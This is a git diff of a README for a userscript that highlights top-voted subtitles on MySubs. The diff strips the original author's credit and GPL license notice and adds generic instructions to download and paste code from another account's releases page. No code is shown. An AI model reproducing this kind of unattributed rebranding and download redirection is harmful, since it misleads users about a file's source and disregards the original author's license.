@@ -1,36 +1,76 @@
-<div align="center">
-  <img src="https://raw.githubusercontent.com/igorskyflyer/userscript-mysubs-best-subtitle-highlighter/main/media/mysubs-best-subtitle-highlighter.png" alt="Colorful filmstrip speech bubble icon representing MySubs Best Subtitle Highlighter UserScript for movies" width="256" height="256">
-  <h1>MySubs Best Subtitle Highlighter</h1>
-</div>
+# ✨ userscript-mysubs-best-subtitle-highlighter - Automatically Highlight Your Best Subtitle
 
-<br>
+[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/Sitharthsithu/userscript-mysubs-best-subtitle-highlighter/releases)
 
-<h4 align="center">
-  A UserScript that automatically highlights the most-voted subtitle per language on MySubs film pages.
-  Works only for films, series pages are not supported due to single subtitle listings.
-</h4>
+## 🚀 Getting Started
 
-<br>
+Welcome to the userscript-mysubs-best-subtitle-highlighter! This tool enhances your experience on MySubs by automatically highlighting the most popular subtitles. Follow the steps below to download and install the script.
 
-## ✅ Features
-- Detects and highlights the subtitle with the highest vote count
-- Applies custom styling for quick visual selection
-- Supports `.co`, `.com`, and `.net` domains
+## 📥 Download & Install
 
-<br>
+1. **Visit the Release Page**  
+   Click this link to go to the [Releases page](https://github.com/Sitharthsithu/userscript-mysubs-best-subtitle-highlighter/releases).  
+   
+2. **Choose the Latest Version**  
+   Find the latest version of the script. You will see a list of available files.
 
-## 🧩 Compatibility
-- Chrome
-- Firefox
-- Safari
-- Edge
-- Opera
+3. **Download the Script**  
+   Click on the file name to download the script to your computer.
 
-<br>
+4. **Install Tampermonkey or Greasemonkey**  
+   You need to install a user script manager. Choose one of the following:
 
-## 📜 License
-Licensed under the [**GPL-3.0-or-later**](https://github.com/igorskyflyer/userscript-mysubs-best-subtitle-highlighter/blob/main/LICENSE).
+   - **Tampermonkey**: Available for Chrome, Firefox, Microsoft Edge, and Safari.
+   - **Greasemonkey**: Available for Firefox.
 
----
+   Find them in your browser's extension store and install.
 
-Made with care by [**Igor Dimitrijević (igorskyflyer)**](https://github.com/igorskyflyer).
+5. **Add the Script**  
+   - Open Tampermonkey or Greasemonkey.
+   - Click on the extension icon.
+   - Select "Add a new script."
+   - Paste the code from the downloaded file.
+   - Save the changes.
+
+6. **Visit MySubs**  
+   Go to any MySubs film page. You should now see the most popular subtitle highlighted automatically.
+
+## 📋 Requirements
+
+- **Web Browser**: Chrome, Firefox, Microsoft Edge, or Safari.
+- **User Script Manager**: Tampermonkey or Greasemonkey.
+
+## ⚙️ Features
+
+- **Automatic Highlighting**: The script highlights the most popular subtitle based on user votes.
+- **User-Friendly**: Easy installation with clear instructions.
+- **Cross-Browser Compatibility**: Works on all major web browsers with a user script manager.
+
+## 👨‍💻 Topics Covered
+
+This project covers several topics relevant to users interested in subtitles and films, including:
+
+- Browser extensions
+- User scripts for web pages
+- Subtitle management
+- Enhancements for film viewing
+
+## 🛠️ Troubleshooting
+
+If you encounter any issues:
+
+- **Check your Script Manager**: Ensure that Tampermonkey or Greasemonkey is active.
+- **Refresh the Page**: Sometimes a simple page refresh can solve problems.
+- **Reinstall the Script**: If highlighting does not work, try removing and then re-adding the script.
+
+## 🌍 Community & Support
+
+You can connect with other users and get support by visiting the repository. Feel free to open an issue if you find a bug or have a question.
+
+## 🔗 Links
+
+- [Releases Page for Download](https://github.com/Sitharthsithu/userscript-mysubs-best-subtitle-highlighter/releases)
+- [Tampermonkey](https://www.tampermonkey.net/)
+- [Greasemonkey](https://www.greasespot.net/)
+
+Thank you for using the userscript-mysubs-best-subtitle-highlighter! Enjoy your enriched subtitle experience on MySubs.
